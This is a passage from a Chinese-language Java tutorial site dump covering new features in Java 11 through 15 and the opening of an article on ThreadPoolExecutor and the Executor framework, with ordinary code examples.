之间共享的实现细节代码应该存在于辅助类中。统一垃圾回收接口的主要原因是：让垃圾回收器（GC）这部分代码更加整洁，便于新人上手开发，便于后续排查相关问题。 \u0026hellip;\u0026hellip;  Java11    Java11 于 2018 年 9 月 25 日正式发布，这是很重要的一个版本！Java 11 和 2017 年 9 月份发布的 Java 9 以及 2018 年 3 月份发布的 Java 10 相比，其最大的区别就是：在长期支持(Long-Term-Support)方面，Oracle 表示会对 Java 11 提供大力支持，这一支持将会持续至 2026 年 9 月。这是据 Java 8 以后支持的首个长期版本。\nString    Java 11 增加了一系列的字符串处理方法，如以下所示。\nGuide：说白点就是多了层封装，JDK 开发组的人没少看市面上常见的工具类框架啊!\n//判断字符串是否为空 \u0026#34; \u0026#34;.isBlank();//true //去除字符串首尾空格 \u0026#34; Java \u0026#34;.strip();// \u0026#34;Java\u0026#34; //去除字符串首部空格 \u0026#34; Java \u0026#34;.stripLeading(); // \u0026#34;Java \u0026#34; //去除字符串尾部空格 \u0026#34; Java \u0026#34;.stripTrailing(); // \u0026#34; Java\u0026#34; //重复字符串多少次 \u0026#34;Java\u0026#34;.repeat(3); // \u0026#34;JavaJavaJava\u0026#34;  //返回由行终止符分隔的字符串集合。 \u0026#34;A\\nB\\nC\u0026#34;.lines().count(); // 3 \u0026#34;A\\nB\\nC\u0026#34;.lines().collect(Collectors.toList()); Optional    新增了empty()方法来判断指定的 Optional 对象是否为空。\nvar op = Optional.empty(); System.out.println(op.isEmpty());//判断指定的 Optional 对象是否为空 ZGC(可伸缩低延迟垃圾收集器)    ZGC 即 Z Garbage Collector，是一个可伸缩的、低延迟的垃圾收集器。\nZGC 主要为了满足如下目标进行设计：\n GC 停顿时间不超过 10ms 即能处理几百 MB 的小堆，也能处理几个 TB 的大堆 应用吞吐能力不会下降超过 15%（与 G1 回收算法相比） 方便在此基础上引入新的 GC 特性和利用 colored 针以及 Load barriers 优化奠定基础 当前只支持 Linux/x64 位平台  ZGC 目前 处在实验阶段，只支持 Linux/x64 平台。\n与 CMS 中的 ParNew 和 G1 类似，ZGC 也采用标记-复制算法，不过 ZGC 对该算法做了重大改进。\n在 ZGC 中出现 Stop The World 的情况会更少！\n详情可以看 ： 《新一代垃圾回收器 ZGC 的探索与实践》\n标准 HTTP Client 升级    Java 11 对 Java 9 中引入并在 Java 10 中进行了更新的 Http Client API 进行了标准化，在前两个版本中进行孵化的同时，Http Client 几乎被完全重写，并且现在完全支持异步非阻塞。\n并且，Java11 中，Http Client 的包名由 jdk.incubator.http 改为java.net.http，该 API 通过 CompleteableFuture 提供非阻塞请求和响应语义。使用起来也很简单，如下：\nvar request = HttpRequest.newBuilder() .uri(URI.create(\u0026#34;https://javastack.cn\u0026#34;)) .GET() .build(); var client = HttpClient.newHttpClient(); // 同步 HttpResponse\u0026lt;String\u0026gt; response = client.send(request, HttpResponse.BodyHandlers.ofString()); System.out.println(response.body()); // 异步 client.sendAsync(request, HttpResponse.BodyHandlers.ofString()) .thenApply(HttpResponse::body) .thenAccept(System.out::println); var(Lambda 参数的局部变量语法)    从 Java 10 开始，便引入了局部变量类型推断这一关键特性。类型推断允许使用关键字 var 作为局部变量的类型而不是实际类型，编译器根据分配给变量的值推断出类型。\nJava 10 中对 var 关键字存在几个限制\n 只能用于局部变量上 声明时必须初始化 不能用作方法参数 不能在 Lambda 表达式中使用  Java11 开始允许开发者在 Lambda 表达式中使用 var 进行参数声明。\n// 下面两者是等价的 Consumer\u0026lt;String\u0026gt; consumer = (var i) -\u0026gt; System.out.println(i); Consumer\u0026lt;String\u0026gt; consumer = (String i) -\u0026gt; System.out.println(i); 启动单文件源代码程序    JEP 330:启动单文件源代码程序（aunch Single-File Source-Code Programs） 可以让我们运行单一文件的 Java 源代码。此功能允许使用 Java 解释器直接执行 Java 源代码。源代码在内存中编译，然后由解释器执行，不需要在磁盘上生成 .class 文件了。\n唯一的约束在于所有相关的类必须定义在同一个 Java 文件中。\n对于 Java 初学者并希望尝试简单程序的人特别有用，并且能和 jshell 一起使用\n一定能程度上增强了使用 Java 来写脚本程序的能力。\nJava11 其他新特性     新的垃圾回收器 Epsilon ：一个完全消极的 GC 实现，分配有限的内存资源，最大限度的降低内存占用和内存吞吐延迟时间 低开销的 Heap Profiling ：Java 11 中提供一种低开销的 Java 堆分配采样方法，能够得到堆分配的 Java 对象信息，并且能够通过 JVMTI 访问堆信息 TLS1.3 协议 ：Java 11 中包含了传输层安全性（TLS）1.3 规范（RFC 8446）的实现，替换了之前版本中包含的 TLS，包括 TLS 1.2，同时还改进了其他 TLS 功能，例如 OCSP 装订扩展（RFC 6066，RFC 6961），以及会话散列和扩展主密钥扩展（RFC 7627），在安全性和性能方面也做了很多提升 飞行记录器(Java Flight Recorder) ：飞行记录器之前是商业版 JDK 的一项分析工具，但在 Java 11 中，其代码被包含到公开代码库中，这样所有人都能使用该功能了。 \u0026hellip;\u0026hellip;  Java12    String    Java 11 增加了两个的字符串处理方法，如以下所示。\nindent() 方法可以实现字符串缩进。\nString text = \u0026#34;Java\u0026#34;; // 缩进 4 格 text = text.indent(4); System.out.println(text); text = text.indent(-10); System.out.println(text); 输出：\n Java Java transform() 方法可以用来转变指定字符串。\nString result = \u0026#34;foo\u0026#34;.transform(input -\u0026gt; input + \u0026#34; bar\u0026#34;); System.out.println(result); // foo bar 文件比较    Java 12 添加了以下方法来比较两个文件：\npublic static long mismatch(Path path, Path path2) throws IOException mismatch() 方法用于比较两个文件，并返回第一个不匹配字符的位置，如果文件相同则返回 -1L。\n代码示例（两个文件内容相同的情况）：\nPath filePath1 = Files.createTempFile(\u0026#34;file1\u0026#34;, \u0026#34;.txt\u0026#34;); Path filePath2 = Files.createTempFile(\u0026#34;file2\u0026#34;, \u0026#34;.txt\u0026#34;); Files.writeString(filePath1, \u0026#34;Java 12 Article\u0026#34;); Files.writeString(filePath2, \u0026#34;Java 12 Article\u0026#34;); long mismatch = Files.mismatch(filePath1, filePath2); assertEquals(-1, mismatch); 代码示例（两个文件内容不相同的情况）：\nPath filePath3 = Files.createTempFile(\u0026#34;file3\u0026#34;, \u0026#34;.txt\u0026#34;); Path filePath4 = Files.createTempFile(\u0026#34;file4\u0026#34;, \u0026#34;.txt\u0026#34;); Files.writeString(filePath3, \u0026#34;Java 12 Article\u0026#34;); Files.writeString(filePath4, \u0026#34;Java 12 Tutorial\u0026#34;); long mismatch = Files.mismatch(filePath3, filePath4); assertEquals(8, mismatch); 数字格式化工具类    NumberFormat 新增了对复杂的数字进行格式化的支持\nNumberFormat fmt = NumberFormat.getCompactNumberInstance(Locale.US, NumberFormat.Style.SHORT); String result = fmt.format(1000); System.out.println(result); // 输出为 1K，计算工资是多少K更方便了。。。 Shenandoah GC    Redhat 主导开发的 Pauseless GC 实现，主要目标是 99.9% 的暂停小于 10ms，暂停与堆大小无关等\n和 Java11 开源的 ZGC 相比（需要升级到 JDK11 才能使用），Shenandoah GC 有稳定的 JDK8u 版本，在 Java8 占据主要市场份额的今天有更大的可落地性。\nG1 收集器提升    Java12 为默认的垃圾收集器 G1 带来了两项更新:\n 可中止的混合收集集合 ：JEP344 的实现，为了达到用户提供的停顿时间目标，JEP 344 通过把要被回收的区域集（混合收集集合）拆分为强制和可选部分，使 G1 垃圾回收器能中止垃圾回收过程。 G1 可以中止可选部分的回收以达到停顿时间目标 及时返回未使用的已分配内存 ：JEP346 的实现，增强 G1 GC，以便在空闲时自动将 Java 堆内存返回给操作系统  预览新特性    作为预览特性加入，需要在javac编译和java运行时增加参数--enable-preview 。\n增强 Switch    传统的 switch 语法存在容易漏写 break 的问题，而且从代码整洁性层面来看，多个 break 本质也是一种重复\nJava12 增强了 swtich 表达式，使用类似 lambda 语法条件匹配成功后的执行块，不需要多写 break 。\nswitch (day) { case MONDAY, FRIDAY, SUNDAY -\u0026gt; System.out.println(6); case TUESDAY -\u0026gt; System.out.println(7); case THURSDAY, SATURDAY -\u0026gt; System.out.println(8); case WEDNESDAY -\u0026gt; System.out.println(9); } instanceof 模式匹配    instanceof 主要在类型强转前探测对象的具体类型。\n之前的版本中，我们需要显示地对对象进行类型转换。\nObject obj = \u0026#34;我是字符串\u0026#34;; if(obj instanceof String){ String str = (String) obj; System.out.println(str); } 新版的 instanceof 可以在判断是否属于具体的类型同时完成转换。\nObject obj = \u0026#34;我是字符串\u0026#34;; if(obj instanceof String str){ System.out.println(str); } Java13    增强 ZGC(释放未使用内存)    在 Java 11 中是实验性的引入的 ZGC 在实际的使用中存在未能主动将未使用的内存释放给操作系统的问题。\nZGC 堆由一组称为 ZPages 的堆区域组成。在 GC 周期中清空 ZPages 区域时，它们将被释放并返回到页面缓存 ZPageCache 中，此缓存中的 ZPages 按最近最少使用（LRU）的顺序，并按照大小进行组织。\n在 Java 13 中，ZGC 将向操作系统返回被标识为长时间未使用的页面，这样它们将可以被其他进程重用。\nSocketAPI 重构    Java Socket API 终于迎来了重大更新！\nJava 13 将 Socket API 的底层进行了重写， NioSocketImpl 是对 PlainSocketImpl 的直接替代，它使用 java.util.concurrent 包下的锁而不是同步方法。如果要使用旧实现，请使用 -Djdk.net.usePlainSocketImpl=true。\n并且，在 Java 13 中是默认使用新的 Socket 实现。\npublic final class NioSocketImpl extends SocketImpl implements PlatformSocketImpl { } FileSystems    FileSystems 类中添加了以下三种新方法，以便更容易地使用将文件内容视为文件系统的文件系统提供程序：\n newFileSystem(Path) newFileSystem(Path, Map\u0026lt;String, ?\u0026gt;) newFileSystem(Path, Map\u0026lt;String, ?\u0026gt;, ClassLoader)  动态 CDS 存档    Java 13 中对 Java 10 中引入的应用程序类数据共享(AppCDS)进行了进一步的简化、改进和扩展，即：允许在 Java 应用程序执行结束时动态进行类归档，具体能够被归档的类包括所有已被加载，但不属于默认基层 CDS 的应用程序类和引用类库中的类。\n这提高了应用程序类数据共享（AppCDS）的可用性。无需用户进行试运行来为每个应用程序创建类列表。\n$ java -XX:ArchiveClassesAtExit=my_app_cds.jsa -cp my_app.jar $ java -XX:SharedArchiveFile=my_app_cds.jsa -cp my_app.jar 预览新特性    文本块    解决 Java 定义多行字符串时只能通过换行转义或者换行连接符来变通支持的问题，引入三重双引号来定义多行文本。\nJava 13 支持两个 \u0026quot;\u0026quot;\u0026quot; 符号中间的任何内容都会被解释为字符串的一部分，包括换行符。\n未支持文本块之前的 HTML 写法：\nString json =\u0026#34;{\\n\u0026#34; + \u0026#34; \\\u0026#34;name\\\u0026#34;:\\\u0026#34;mkyong\\\u0026#34;,\\n\u0026#34; + \u0026#34; \\\u0026#34;age\\\u0026#34;:38\\n\u0026#34; + \u0026#34;}\\n\u0026#34;; 支持文本块之后的 HTML 写法：\nString json = \u0026#34;\u0026#34;\u0026#34; { \u0026#34;name\u0026#34;:\u0026#34;mkyong\u0026#34;, \u0026#34;age\u0026#34;:38 } \u0026#34;\u0026#34;\u0026#34;; 未支持文本块之前的 SQL 写法：\nString query = \u0026#34;SELECT `EMP_ID`, `LAST_NAME` FROM `EMPLOYEE_TB`\\n\u0026#34; + \u0026#34;WHERE `CITY` = \u0026#39;INDIANAPOLIS\u0026#39;\\n\u0026#34; + \u0026#34;ORDER BY `EMP_ID`, `LAST_NAME`;\\n\u0026#34;; 支持文本块之后的 SQL 写法：\nString query = \u0026#34;\u0026#34;\u0026#34; SELECT `EMP_ID`, `LAST_NAME` FROM `EMPLOYEE_TB` WHERE `CITY` = \u0026#39;INDIANAPOLIS\u0026#39; ORDER BY `EMP_ID`, `LAST_NAME`; \u0026#34;\u0026#34;\u0026#34;; 另外，String 类新增加了 3 个新的方法来操作文本块：\n formatted(Object... args) ：它类似于 String 的format()方法。添加它是为了支持文本块的格式设置。 stripIndent() ：用于去除文本块中每一行开头和结尾的空格。 translateEscapes() ：转义序列如 “\\\\t” 转换为 “\\t”  由于文本块是一项预览功能，可以在未来版本中删除，因此这些新方法被标记为弃用。\n@Deprecated(forRemoval=true, since=\u0026#34;13\u0026#34;) public String stripIndent() { } @Deprecated(forRemoval=true, since=\u0026#34;13\u0026#34;) public String formatted(Object... args) { } @Deprecated(forRemoval=true, since=\u0026#34;13\u0026#34;) public String translateEscapes() { } 增强 Switch(引入 yield 关键字到 Switch 中)    Switch 表达式中就多了一个关键字用于跳出 Switch 块的关键字 yield，主要用于返回一个值\nyield和 return 的区别在于：return 会直接跳出当前循环或者方法，而 yield 只会跳出当前 Switch 块，同时在使用 yield 时，需要有 default 条件\nprivate static String descLanguage(String name) { return switch (name) { case \u0026#34;Java\u0026#34;: yield \u0026#34;object-oriented, platform independent and secured\u0026#34;; case \u0026#34;Ruby\u0026#34;: yield \u0026#34;a programmer\u0026#39;s best friend\u0026#34;; default: yield name +\u0026#34; is a good language\u0026#34;; }; } Java14    空指针异常精准提示    通过 JVM 参数中添加-XX:+ShowCodeDetailsInExceptionMessages，可以在空指针异常中获取更为详细的调用信息，更快的定位和解决问题。\na.b.c.i = 99; // 假设这段代码会发生空指针 Java 14 之前：\nException in thread \u0026#34;main\u0026#34; java.lang.NullPointerException at NullPointerExample.main(NullPointerExample.java:5) Java 14 之后：\n// 增加参数后提示的异常中很明确的告知了哪里为空导致 Exception in thread \u0026#34;main\u0026#34; java.lang.NullPointerException: Cannot read field \u0026#39;c\u0026#39; because \u0026#39;a.b\u0026#39; is null. at Prog.main(Prog.java:5) switch 的增强(转正)    Java12 引入的 switch（预览特性）在 Java14 变为正式版本，不需要增加参数来启用，直接在 JDK14 中就能使用。\nJava12 为 switch 表达式引入了类似 lambda 语法条件匹配成功后的执行块，不需要多写 break ，Java13 提供了 yield 来在 block 中返回值。\nString result = switch (day) { case \u0026#34;M\u0026#34;, \u0026#34;W\u0026#34;, \u0026#34;F\u0026#34; -\u0026gt; \u0026#34;MWF\u0026#34;; case \u0026#34;T\u0026#34;, \u0026#34;TH\u0026#34;, \u0026#34;S\u0026#34; -\u0026gt; \u0026#34;TTS\u0026#34;; default -\u0026gt; { if(day.isEmpty()) yield \u0026#34;Please insert a valid day.\u0026#34;; else yield \u0026#34;Looks like a Sunday.\u0026#34;; } }; System.out.println(result); 预览新特性    record 关键字    简化数据类的定义方式，使用 record 代替 class 定义的类，只需要声明属性，就可以在获得属性的访问方法，以及 toString()，hashCode(), equals()方法\n类似于使用 class 定义类，同时使用了 lombok 插件，并打上了@Getter,@ToString,@EqualsAndHashCode注解\n/** * 这个类具有两个特征 * 1. 所有成员属性都是final * 2. 全部方法由构造方法，和两个成员属性访问器组成（共三个） * 那么这种类就很适合使用record来声明 */ final class Rectangle implements Shape { final double length; final double width; public Rectangle(double length, double width) { this.length = length; this.width = width; } double length() { return length; } double width() { return width; } } /** * 1. 使用record声明的类会自动拥有上面类中的三个方法 * 2. 在这基础上还附赠了equals()，hashCode()方法以及toString()方法 * 3. toString方法中包括所有成员属性的字符串表示形式及其名称 */ record Rectangle(float length, float width) { } 文本块    Java14 中，文本块依然是预览特性，不过，其引入了两个新的转义字符：\n \\ : 表示行尾，不引入换行符 \\s ：表示单个空格  String str = \u0026#34;凡心所向，素履所往，生如逆旅，一苇以航。\u0026#34;; String str2 = \u0026#34;\u0026#34;\u0026#34; 凡心所向，素履所往， \\ 生如逆旅，一苇以航。\u0026#34;\u0026#34;\u0026#34;; System.out.println(str2);// 凡心所向，素履所往， 生如逆旅，一苇以航。 String text = \u0026#34;\u0026#34;\u0026#34; java c++\\sphp \u0026#34;\u0026#34;\u0026#34;; System.out.println(text); //输出： java c++ php instanceof 增强    依然是预览特性 ，Java 12 新特性中介绍过。\nJava14 其他特性     从 Java11 引入的 ZGC 作为继 G1 过后的下一代 GC 算法，从支持 Linux 平台到 Java14 开始支持 MacOS 和 Window（个人感觉是终于可以在日常开发工具中先体验下 ZGC 的效果了，虽然其实 G1 也够用） 移除了 CMS(Concurrent Mark Sweep) 垃圾收集器（功成而退） 新增了 jpackage 工具，标配将应用打成 jar 包外，还支持不同平台的特性包，比如 linux 下的deb和rpm，window 平台下的msi和exe  Java15    CharSequence    CharSequence 接口添加了一个默认方法 isEmpty() 来判断字符序列为空，如果是则返回 true。\npublic interface CharSequence { default boolean isEmpty() { return this.length() == 0; } } TreeMap    TreeMap 新引入了下面这些方法：\n putIfAbsent() computeIfAbsent() computeIfPresent() compute() merge()  ZGC(转正)    Java11 的时候 ，ZGC 还在试验阶段。\n当时，ZGC 的出现让众多 Java 开发者看到了垃圾回收器的另外一种可能，因此备受关注。\n经过多个版本的迭代，不断的完善和修复问题，ZGC 在 Java 15 已经可以正式使用了！\n不过，默认的垃圾回收器依然是 G1。你可以通过下面的参数启动 ZGC：\n$ java -XX:+UseZGC className EdDSA(数字签名算法)    新加入了一个安全性和性能都更强的基于 Edwards-Curve Digital Signature Algorithm （EdDSA）实现的数字签名算法。\n虽然其性能优于现有的 ECDSA 实现，不过，它并不会完全取代 JDK 中现有的椭圆曲线数字签名算法( ECDSA)。\nKeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;Ed25519\u0026#34;); KeyPair kp = kpg.generateKeyPair(); byte[] msg = \u0026#34;test_string\u0026#34;.getBytes(StandardCharsets.UTF_8); Signature sig = Signature.getInstance(\u0026#34;Ed25519\u0026#34;); sig.initSign(kp.getPrivate()); sig.update(msg); byte[] s = sig.sign(); String encodedString = Base64.getEncoder().encodeToString(s); System.out.println(encodedString); 输出：\n0Hc0lxxASZNvS52WsvnncJOH/mlFhnA8Tc6D/k5DtAX5BSsNVjtPF4R4+yMWXVjrvB2mxVXmChIbki6goFBgAg== 文本块(转正)    在 Java 15 ，文本块是正式的功能特性了。\n隐藏类(Hidden Classes)    隐藏类是为框架（frameworks）所设计的，隐藏类不能直接被其他类的字节码使用，只能在运行时生成类并通过反射间接使用它们。\n预览新特性    密封类    Java 15 对 Java 14 中引入的预览新特性进行了增强，主要是引入了一个新的概念 密封类（Sealed Classes）。\n密封类可以对继承或者实现它们的类进行限制。\n比如抽象类 Person 只允许 Employee 和 Manager 继承。\npublic abstract sealed class Person permits Employee, Manager { //... } 另外，任何扩展密封类的类本身都必须声明为 sealed、non-sealed 或 final。\npublic final class Employee extends Person { } public non-sealed class Manager extends Person { } instanceof 模式匹配    Java 15 并没有对此特性进行调整，继续预览特性，主要用于接受更多的使用反馈。\n在未来的 Java 版本中，Java 的目标是继续完善 instanceof 模式匹配新特性。\nJava15 其他新特性     Nashorn JavaScript 引擎彻底移除 ：Nashorn 从 Java8 开始引入的 JavaScript 引擎，Java9 对 Nashorn 做了些增强，实现了一些 ES6 的新特性。在 Java 11 中就已经被弃用，到了 Java 15 就彻底被删除了。 DatagramSocket API 重构 禁用和废弃偏向锁（Biased Locking） ： 偏向锁的引入增加了 JVM 的复杂性大于其带来的性能提升。不过，你仍然可以使用 -XX:+UseBiasedLocking 启用偏向锁定，但它会提示 这是一个已弃用的 API。 \u0026hellip;\u0026hellip;  总结    关于预览特性    先贴一段 oracle 官网原文：This is a preview feature, which is a feature whose design, specification, and implementation are complete, but is not permanent, which means that the feature may exist in a different form or not at all in future JDK releases. To compile and run code that contains preview features, you must specify additional command-line options.\n这是一个预览功能，该功能的设计，规格和实现是完整的，但不是永久性的，这意味着该功能可能以其他形式存在或在将来的 JDK 版本中根本不存在。 要编译和运行包含预览功能的代码，必须指定其他命令行选项。\n就以switch的增强为例子，从 Java12 中推出，到 Java13 中将继续增强，直到 Java14 才正式转正进入 JDK 可以放心使用，不用考虑后续 JDK 版本对其的改动或修改\n一方面可以看出 JDK 作为标准平台在增加新特性的严谨态度，另一方面个人认为是对于预览特性应该采取审慎使用的态度。特性的设计和实现容易，但是其实际价值依然需要在使用中去验证\nJVM 虚拟机优化    每次 Java 版本的发布都伴随着对 JVM 虚拟机的优化，包括对现有垃圾回收算法的改进，引入新的垃圾回收算法，移除老旧的不再适用于今天的垃圾回收算法等\n整体优化的方向是高效，低时延的垃圾回收表现\n对于日常的应用开发者可能比较关注新的语法特性，但是从一个公司角度来说，在考虑是否升级 Java 平台时更加考虑的是JVM 运行时的提升\n参考资料     JDK Project Overview ： \u0026lt;https://openjdk.java.net/projects/jdk/ \u0026gt; IBM Developer Java9 https://www.ibm.com/developerworks/cn/java/the-new-features-of-Java-9/ Guide to Java10 https://www.baeldung.com/java-10-overview Java 10 新特性介绍https://www.ibm.com/developerworks/cn/java/the-new-features-of-Java-10/index.html IBM Devloper Java11 https://www.ibm.com/developerworks/cn/java/the-new-features-of-Java-11/index.html Java 11 – Features and Comparison： https://www.geeksforgeeks.org/java-11-features-and-comparison/ Oracle Java12 ReleaseNote https://www.oracle.com/technetwork/java/javase/12all-relnotes-5211423.html#NewFeature Oracle Java13 ReleaseNote https://www.oracle.com/technetwork/java/javase/13all-relnotes-5461743.html#NewFeature New Features in Java 12 https://www.baeldung.com/java-12-new-features New Java13 Features https://www.baeldung.com/java-13-new-features Java13 新特性概述 https://www.ibm.com/developerworks/cn/java/the-new-features-of-Java-13/index.html Oracle Java14 record https://docs.oracle.com/en/java/javase/14/language/records.html java14-features https://www.techgeeknext.com/java/java14-features Java 14 Features : https://www.journaldev.com/37273/java-14-features What is new in Java 15: https://mkyong.com/java/what-is-new-in-java-15/  "},{"id":231,"href":"/java/multi-thread/java%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","title":"java线程池学习总结","parent":"multi-thread","content":"一 使用线程池的好处     池化技术想必大家已经屡见不鲜了，线程池、数据库连接池、Http 连接池等等都是对这个思想的应用。池化技术的思想主要是为了减少每次获取资源的消耗，提高对资源的利用率。\n 线程池提供了一种限制和管理资源（包括执行一个任务）。 每个线程池还维护一些基本统计信息，例如已完成任务的数量。\n这里借用《Java 并发编程的艺术》提到的来说一下使用线程池的好处：\n 降低资源消耗。通过重复利用已创建的线程降低线程创建和销毁造成的消耗。 提高响应速度。当任务到达时，任务可以不需要等到线程创建就能立即执行。 提高线程的可管理性。线程是稀缺资源，如果无限制的创建，不仅会消耗系统资源，还会降低系统的稳定性，使用线程池可以进行统一的分配，调优和监控。  二 Executor 框架    2.1 简介    Executor 框架是 Java5 之后引进的，在 Java 5 之后，通过 Executor 来启动线程比使用 Thread 的 start 方法更好，除了更易管理，效率更好（用线程池实现，节约开销）外，还有关键的一点：有助于避免 this 逃逸问题。\n 补充：this 逃逸是指在构造函数返回之前其他线程就持有该对象的引用. 调用尚未构造完全的对象的方法可能引发令人疑惑的错误。\n Executor 框架不仅包括了线程池的管理，还提供了线程工厂、队列以及拒绝策略等，Executor 框架让并发编程变得更加简单。\n2.2 Executor 框架结构(主要由三大部分组成)    1) 任务(Runnable /Callable)    执行任务需要实现的 Runnable 接口 或 Callable接口。Runnable 接口或 Callable 接口 实现类都可以被 ThreadPoolExecutor 或 ScheduledThreadPoolExecutor 执行。\n2) 任务的执行(Executor)    如下图所示，包括任务执行机制的核心接口 Executor ，以及继承自 Executor 接口的 ExecutorService 接口。ThreadPoolExecutor 和 ScheduledThreadPoolExecutor 这两个关键类实现了 ExecutorService 接口。\n这里提了很多底层的类关系，但是，实际上我们需要更多关注的是 ThreadPoolExecutor 这个类，这个类在我们实际使用线程池的过程中，使用频率还是非常高的。\n 注意： 通过查看 ScheduledThreadPoolExecutor 源代码我们发现 ScheduledThreadPoolExecutor 实际上是继承了 ThreadPoolExecutor 并实现了 ScheduledExecutorService ，而 ScheduledExecutorService 又实现了 ExecutorService，正如我们下面给出的类关系图显示的一样。\n ThreadPoolExecutor 类描述:\n//AbstractExecutorService实现了ExecutorService接口 public class ThreadPoolExecutor extends AbstractExecutorService ScheduledThreadPoolExecutor 类描述:\n//ScheduledExecutorService继承ExecutorService接口 public class ScheduledThreadPoolExecutor extends ThreadPoolExecutor implements ScheduledExecutorService 3) 异步计算的结果(Future)    Future 接口以及 Future 接口的实现类 FutureTask 类都可以代表异步计算的结果。\n当我们把 Runnable接口 或 Callable 接口 的实现类提交给 ThreadPoolExecutor 或 ScheduledThreadPoolExecutor 执行。（调用 submit() 方法时会返回一个 FutureTask 对象）\n2.3 Executor 框架的使用示意图     主线程首先要创建实现 Runnable 或者 Callable 接口的任务对象。 把创建完成的实现 Runnable/Callable接口的 对象直接交给 ExecutorService 执行: ExecutorService.execute（Runnable command））或者也可以把 Runnable 对象或Callable 对象提交给 ExecutorService 执行（ExecutorService.submit（Runnable task）或 ExecutorService.submit（Callable \u0026lt;T\u0026gt; task））。 如果执行 ExecutorService.submit（…），ExecutorService 将返回一个实现Future接口的对象（我们刚刚也提到过了执行 execute()方法和 submit()方法的区别，submit()会返回一个 FutureTask 对象）。由于 FutureTask 实现了 Runnable，我们也可以创建 FutureTask，然后直接交给 ExecutorService 执行。 最后，主线程可以执行 FutureTask.get()方法来等待任务执行完成。主线程也可以执行 FutureTask.cancel（boolean mayInterruptIfRunning）来取消此任务的执行。  三 (重要)ThreadPoolExecutor 类简单介绍    线程池实现类 ThreadPoolExecutor 是 Executor 框架最核心的类。\n3.1 ThreadPoolExecutor 类分析    ThreadPoolExecutor 类中提供的四个构造方法。我们来看最长的那个，其余三个都是在这个构造方法的基础上产生（其他几个构造方法说白点都是给定某些默认参数的构造方法比如默认制定拒绝策略是什么）。\n/** * 用给定的初始参数创建一个新的ThreadPoolExecutor。 */ public ThreadPoolExecutor(int corePoolSize,//线程池的核心线程数量  int maximumPoolSize,//线程池的最大线程数  long keepAliveTime,//当线程数大于核心线程数时，多余的空闲线程存活的最长时间  TimeUnit unit,//时间单位  BlockingQueue\u0026lt;Runnable\u0026gt; workQueue,//任务队列，用来储存等待执行任务的队列  ThreadFactory threadFactory,//线程工厂，用来创建线程，一般默认即可  RejectedExecutionHandler handler//拒绝策略，当提交的任务过多而不能及时处理时，我们可以定制策略来处理任务  ) { if (corePoolSize \u0026lt; 0 || maximumPoolSize \u0026lt;= 0 || maximumPoolSize \u0026lt; corePoolSize || keepAliveTime \u0026lt; 0) throw new IllegalArgumentException(); if (workQueue == null || threadFactory == null || handler == null) throw new NullPointerException(); this.corePoolSize = corePoolSize; this.maximumPoolSize = maximumPoolSize; this.workQueue = workQueue; this.keepAliveTime = unit.toNanos(keepAliveTime); this.threadFactory = threadFactory; this.handler = handler; } 下面这些对创建非常重要，在后面使用线程池的过程中你一定会用到！所以，务必拿着小本本记清楚。\nThreadPoolExecutor 3 个最重要的参数：\n corePoolSize : 核心线程数线程数定义了最小可以同时运行的线程数量。 maximumPoolSize : 当队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数。 workQueue: 当新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，新任务就会被存放在队列中。  ThreadPoolExecutor其他常见参数 :\n keepAliveTime:当线程池中的线程数量大于 corePoolSize 的时候，如果这时没有新的任务提交，核心线程外的线程不会立即销毁，而是会等待，直到等待的时间超过了 keepAliveTime才会被回收销毁； unit : keepAliveTime 参数的时间单位。 threadFactory :executor 创建新线程的时候会用到。 handler :饱和策略。关于饱和策略下面单独介绍一下。  下面这张图可以加深你对线程池中各个参数的相互关系的理解（图片来源：《Java 性能调优实战》）：\nThreadPoolExecutor 饱和策略定义:\n如果当前同时运行的线程数量达到最大线程数量并且队列也已经被放满了任务时，ThreadPoolTaskExecutor 定义一些策略:\n ThreadPoolExecutor.AbortPolicy ：抛出 RejectedExecutionException来拒绝新任务的处理。 ThreadPoolExecutor.CallerRunsPolicy ：调用执行自己的线程运行任务，也就是直接在调用execute方法的线程中运行(run)被拒绝的任务，如果执行程序已关闭，则会丢弃该任务。因此这种策略会降低对于新任务提交速度，影响程序的整体性能。如果您的应用程序可以承受此延迟并且你要求任何一个任务请求都要被执行的话，你可以选择这个策略。 ThreadPoolExecutor.DiscardPolicy ：不处理新任务，直接丢弃掉。 ThreadPoolExecutor.DiscardOldestPolicy ： 此策略将丢弃最早的未处理的任务请求。  举个例子：\n Spring 通过 ThreadPoolTaskExecutor 或者我们直接通过 ThreadPoolExecutor 的构造函数创建线程池的时候，当我们不指定 RejectedExecutionHandler 饱和策略的话来配置线程池的时候默认使用的是 ThreadPoolExecutor.AbortPolicy。在默认情况下，ThreadPoolExecutor 将抛出 RejectedExecutionException 来拒绝新来的任务 ，这代表你将丢失对这个任务的处理。 对于可伸缩的应用程序，建议使用 ThreadPoolExecutor.CallerRunsPolicy。当最大池被填满时，此策略为我们提供可伸缩队列。（这个直接查看 ThreadPoolExecutor 的构造函数源码就可以看出，比较简单的原因，这里就不贴代码了。）\n 3.2 推荐使用 ThreadPoolExecutor 构造函数创建线程池    在《阿里巴巴 Java 开发手册》“并发处理”这一章节，明确指出线程资源必须通过线程池提供，不允许在应用中自行显式创建线程。\n为什么呢？\n 使用线程池的好处是减少在创建和销毁线程上所消耗的时间以及系统资源开销，解决资源不足的问题。如果不使用线程池，有可能会造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。\n 另外，《阿里巴巴 Java 开发手册》中强制线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 构造函数的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险\n Executors 返回线程池对象的弊端如下(后文会详细介绍到)：\n FixedThreadPool 和 SingleThreadExecutor ： 允许请求的队列长度为 Integer.MAX_VALUE,可能堆积大量的请求，从而导致 OOM。 CachedThreadPool 和 ScheduledThreadPool ： 允许创建的线程数量为 Integer.MAX_VALUE ，可能会创建大量线程，从而导致 OOM。   方式一：通过ThreadPoolExecutor构造函数实现（推荐） 方式二：通过 Executor 框架的工具类 Executors 来实现 我们可以创建三种类型的 ThreadPoolExecutor：\n FixedThreadPool SingleThreadExecutor CachedThreadPool  对应 Executors 工具类中的方法如图所示：\n四 ThreadPoolExecutor 使用+原理分析    我们上面讲解了 Executor框架以及 ThreadPoolExecutor 类，下面让我们实战一下，来通过写一个 ThreadPoolExecutor 的小 Demo 